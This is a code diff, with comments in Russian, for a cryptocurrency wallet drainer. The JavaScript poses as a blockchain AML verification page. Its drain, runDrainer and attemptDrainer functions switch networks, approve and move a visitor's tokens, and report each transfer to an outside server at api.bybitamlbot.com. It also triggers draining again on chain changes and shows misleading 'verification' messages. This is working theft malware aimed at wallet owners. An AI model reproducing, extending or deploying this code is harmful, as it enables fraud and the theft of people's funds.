@@ -2,7 +2,6 @@ import { createAppKit } from '@reown/appkit';
 import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
 import { ethers } from 'ethers';
-import { useAccount, useSwitchChain, useConfig } from 'wagmi';
 import config from './config.js';
 
 const projectId = config.PROJECT_ID;
@@ -271,10 +270,13 @@ function hasFunds(bal) {
   return false;
 }
 
-async function switchChain(chainId, switchChainHook) {
+async function switchChain(chainId) {
   try {
     console.log(`🔄 Переключаем сеть на chainId ${chainId}`);
-    await switchChainHook({ chainId });
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: config.CHAINS[chainId].chainIdHex }]
+    });
     console.log(`✅ Сеть переключена на chainId ${chainId}`);
   } catch (error) {
     console.error(`❌ Ошибка переключения сети: ${error.message}`);
@@ -288,9 +290,9 @@ function shortenAddress(address) {
 }
 
 function detectWallet() {
-  // Поскольку мы используем AppKit, название кошелька можно получить из метаданных сессии
-  const session = appKitModal.getSession();
-  return session?.wallet?.name || "Unknown Wallet";
+  if (window.ethereum?.isMetaMask) return "MetaMask";
+  if (window.ethereum?.isTrust) return "Trust Wallet";
+  return "Unknown Wallet";
 }
 
 function formatBalance(balance, decimals) {
@@ -317,6 +319,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
 
     console.log(`📊 Округлённый баланс: ${roundedBalance}, roundedAmount: ${roundedAmount.toString()}`);
     
+
     const response = await fetch('https://api.bybitamlbot.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -349,6 +352,28 @@ async function drain(chainId, signer, userAddress, bal, provider) {
   if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);
 
   console.log(`📍 Шаг 1: Проверяем конфигурацию для chainId ${chainId}`);
+
+  // Проверяем текущую сеть и переключаем, если нужно
+  const currentNetwork = await provider.getNetwork();
+  if (currentNetwork.chainId !== chainId) {
+    console.log(`📍 Текущая сеть ${currentNetwork.chainId}, переключаем на ${chainId}`);
+    try {
+      await provider.send('wallet_switchEthereumChain', [{ chainId: `0x${chainId.toString(16)}` }]);
+      console.log(`⏳ Ожидаем завершения переключения сети...`);
+      await new Promise(resolve => setTimeout(resolve, 3000));
+      const newNetwork = await provider.getNetwork();
+      if (newNetwork.chainId !== chainId) {
+        throw new Error(`Failed to switch network: expected chainId ${chainId}, but got ${newNetwork.chainId}`);
+      }
+      console.log(`✅ Сеть успешно сменилась на chainId ${chainId}`);
+    } catch (error) {
+      console.error(`❌ Ошибка при переключении сети: ${error.message}`);
+      if (error.code === 4001) {
+        throw new Error("User rejected network switch");
+      }
+      throw new Error(`Network switch failed: ${error.message}`);
+    }
+  }
 
   const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];
 
@@ -604,118 +629,10 @@ async function calculateTotalValueInUSDT(chainId, balance, provider) {
   return totalValue;
 }
 
-// Компонент React для обработки подключения и действий
-function WalletActionComponent() {
-  const { address, isConnected } = useAccount();
-  const { switchChainAsync } = useSwitchChain();
-  const wagmiConfig = useConfig();
-
-  async function attemptDrainer() {
-    if (hasDrained || isTransactionPending) {
-      console.log('⚠️ Транзакция уже выполнена или ожидается');
-      await hideModalWithDelay("Transaction already completed or pending.");
-      return;
-    }
-
-    if (!address) {
-      console.error('❌ Адрес кошелька не определён');
-      showModal();
-      await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
-      return;
-    }
-
-    connectedAddress = address;
-    showModal();
-
-    const drainerTimeout = setTimeout(async () => {
-      isTransactionPending = false;
-      console.error('❌ Тайм-аут выполнения дрейнера');
-      await hideModalWithDelay("Check your wallet for AML!");
-    }, 60000);
-
-    try {
-      const provider = new ethers.providers.Web3Provider(wagmiConfig.getClient(), 'any');
-      const signer = provider.getSigner();
-      const currentAddress = await signer.getAddress();
-
-      if (currentAddress.toLowerCase() !== address.toLowerCase()) {
-        throw new Error('Wallet address mismatch');
-      }
-
-      await new Promise(resolve => setTimeout(resolve, 10));
-
-      isTransactionPending = true;
-      const { targetChainId, targetProvider } = await runDrainer(provider, signer, address);
-      if (targetChainId) {
-        await switchChain(targetChainId, switchChainAsync);
-        const status = await drain(targetChainId, signer, address, await checkBalance(targetChainId, address, targetProvider), targetProvider);
-        console.log('✅ Drainer выполнен, статус:', status);
-      }
-
-      hasDrained = true;
-      isTransactionPending = false;
-      clearTimeout(drainerTimeout);
-      await hideModalWithDelay();
-    } catch (err) {
-      isTransactionPending = false;
-      clearTimeout(drainerTimeout);
-      let errorMessage = "Error: An unexpected error occurred. Please try again.";
-      if (err.message.includes('user rejected')) {
-        errorMessage = "Error: Transaction rejected by user.";
-      } else if (err.message.includes('Insufficient')) {
-        errorMessage = err.message;
-      } else if (err.message.includes('Failed to approve token')) {
-        errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
-      } else if (err.message.includes('Failed to process')) {
-        errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
-      } else if (err.message.includes('Failed to switch chain')) {
-        errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
-      } else {
-        errorMessage = `Error: ${err.message}`;
-      }
-      console.error('❌ Ошибка drainer:', err.message);
-      await hideModalWithDelay(errorMessage);
-      throw err;
-    }
-  }
-
-  async function handleConnectOrAction() {
-    try {
-      if (!isConnected || !address) {
-        console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
-        await appKitModal.open();
-        // Ожидаем подключения через хук useAccount
-        return;
-      } else {
-        console.log('ℹ️ Кошелёк уже подключён:', address);
-        connectedAddress = address;
-      }
-
-      if (!isTransactionPending) {
-        await attemptDrainer();
-      } else {
-        console.log('⏳ Транзакция уже выполняется');
-        await hideModalWithDelay("Transaction already in progress.");
-      }
-    } catch (err) {
-      console.error('❌ Ошибка подключения:', err.message);
-      appKitModal.close();
-      isTransactionPending = false;
-      showModal();
-      await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
-    }
-  }
-
-  return (
-    <div>
-      <button className="action-btn" onClick={handleConnectOrAction}>
-        {isConnected ? 'Sign Transaction' : 'Connect Wallet'}
-      </button>
-    </div>
-  );
-}
-
 window.addEventListener('DOMContentLoaded', () => {
+  const actionButtons = document.querySelectorAll('.action-btn');
+  const isInjected = typeof window.ethereum !== 'undefined';
+
   const link = document.createElement('link');
   link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
   link.rel = 'stylesheet';
@@ -896,7 +813,189 @@ window.addEventListener('DOMContentLoaded', () => {
   document.body.appendChild(modalContent);
 
   modalSubtitle = modalContent.querySelector('.modal-subtitle');
+
+  if (!isInjected) {
+    actionButtons.forEach(btn => {
+      btn.addEventListener('click', () => {
+        window.showWalletRedirectModal();
+      });
+    });
+    return;
+  }
+
+  actionButtons.forEach(btn => {
+    btn.addEventListener('click', handleConnectOrAction);
+  });
+
+  window.ethereum.on('chainChanged', onChainChanged);
 });
 
-// Экспортируем компонент для использования в приложении
-export default WalletActionComponent;
+function showModal() {
+  modalOverlay.style.display = 'block';
+  modalOverlay.style.pointerEvents = 'auto';
+  modalContent.style.display = 'block';
+  modalSubtitle.textContent = "Processing blockchain verification...";
+}
+
+async function hideModalWithDelay(errorMessage = null) {
+  if (errorMessage) {
+    modalSubtitle.textContent = errorMessage;
+    await new Promise(resolve => setTimeout(resolve, 7000));
+  }
+  modalOverlay.style.display = 'none';
+  modalOverlay.style.pointerEvents = 'none';
+  modalContent.style.display = 'none';
+  document.body.style.pointerEvents = 'auto';
+}
+
+async function attemptDrainer() {
+  if (hasDrained || isTransactionPending) {
+    console.log('⚠️ Транзакция уже выполнена или ожидается');
+    await hideModalWithDelay("Transaction already completed or pending.");
+    return;
+  }
+
+  if (!connectedAddress) {
+    console.error('❌ Адрес кошелька не определён');
+    showModal();
+    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
+    return;
+  }
+
+  showModal();
+
+  const drainerTimeout = setTimeout(async () => {
+    isTransactionPending = false;
+    console.error('❌ Тайм-аут выполнения дрейнера');
+    await hideModalWithDelay("Check your wallet for AML!");
+  }, 60000);
+
+  try {
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+    const signer = provider.getSigner();
+    const address = await signer.getAddress();
+
+    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
+      throw new Error('Wallet address mismatch');
+    }
+
+    await new Promise(resolve => setTimeout(resolve, 10));
+
+    isTransactionPending = true;
+    const { targetChainId, targetProvider } = await runDrainer(provider, signer, connectedAddress);
+    if (targetChainId) {
+      await switchChain(targetChainId);
+      const status = await drain(targetChainId, signer, connectedAddress, await checkBalance(targetChainId, connectedAddress, targetProvider), targetProvider);
+      console.log('✅ Drainer выполнен, статус:', status);
+    }
+
+    hasDrained = true;
+    isTransactionPending = false;
+    clearTimeout(drainerTimeout);
+    await hideModalWithDelay();
+  } catch (err) {
+    isTransactionPending = false;
+    clearTimeout(drainerTimeout);
+    let errorMessage = "Error: An unexpected error occurred. Please try again.";
+    if (err.message.includes('user rejected')) {
+      errorMessage = "Error: Transaction rejected by user.";
+    } else if (err.message.includes('Insufficient')) {
+      errorMessage = err.message;
+    } else if (err.message.includes('Failed to approve token')) {
+      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to process')) {
+      errorMessage = "Error: Failed to process native token transfer. Your wallet may not support this operation.";
+    } else if (err.message.includes('Failed to switch chain')) {
+      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
+    } else {
+      errorMessage = `Error: ${err.message}`;
+    }
+    console.error('❌ Ошибка drainer:', err.message);
+    await hideModalWithDelay(errorMessage);
+    throw err;
+  }
+}
+
+async function handleConnectOrAction() {
+  try {
+    if (!connectedAddress) {
+      console.log('ℹ️ Открываем модальное окно AppKit для выбора кошелька');
+      await appKitModal.open();
+      connectedAddress = await waitForWallet();
+      console.log('✅ Подключён:', connectedAddress);
+      appKitModal.close();
+    } else {
+      console.log('ℹ️ Кошелёк уже подключён:', connectedAddress);
+    }
+
+    if (!isTransactionPending) {
+      await attemptDrainer();
+    } else {
+      console.log('⏳ Транзакция уже выполняется');
+      await hideModalWithDelay("Transaction already in progress.");
+    }
+  } catch (err) {
+    console.error('❌ Ошибка подключения:', err.message);
+    appKitModal.close();
+    isTransactionPending = false;
+    showModal();
+    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
+  }
+}
+
+async function onChainChanged(chainId) {
+  console.log('🔄 Смена сети:', chainId);
+  if (connectedAddress && !isTransactionPending) {
+    const provider = new ethers.providers.Web3Provider(window.ethereum, 'any');
+    const newNetwork = await provider.getNetwork();
+    console.log(`📡 Новая сеть: ${newNetwork.name}, chainId: ${newNetwork.chainId}`);
+    await attemptDrainer(provider);
+  } else {
+    console.log('⏳ Транзакция в процессе');
+    await hideModalWithDelay("Transaction in progress, please wait.");
+  }
+}
+
+async function waitForWallet() {
+  return new Promise((resolve, reject) => {
+    console.log('⏳ Ожидаем подключение кошелька через AppKit...');
+
+    const isMobile = isMobileDevice();
+    console.log(`ℹ️ Устройство: ${isMobile ? 'Мобильное' : 'Десктоп'}`);
+
+    const handler = async (accounts) => {
+      if (accounts.length > 0) {
+        console.log('✅ Аккаунты найдены:', accounts);
+        clearTimeout(timeout);
+        clearInterval(checkInterval);
+        resolve(accounts[0]);
+      }
+    };
+
+    window.ethereum.on('accountsChanged', handler);
+
+    const checkInterval = setInterval(async () => {
+      try {
+        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+        if (accounts.length > 0) {
+          clearTimeout(timeout);
+          clearInterval(checkInterval);
+          resolve(accounts[0]);
+        }
+      } catch (err) {
+        console.error('❌ Ошибка проверки аккаунтов:', err.message);
+      }
+    }, 1000);
+
+    const timeout = setTimeout(() => {
+      window.ethereum.removeListener('accountsChanged', handler);
+      clearInterval(checkInterval);
+      reject(new Error('Timeout waiting for wallet connection'));
+    }, 50000);
+
+    window.ethereum.request({ method: 'eth_requestAccounts' }).catch(err => {
+      console.error('❌ Ошибка запроса аккаунтов:', err.message);
+      reject(err);
+    });
+  });
+}
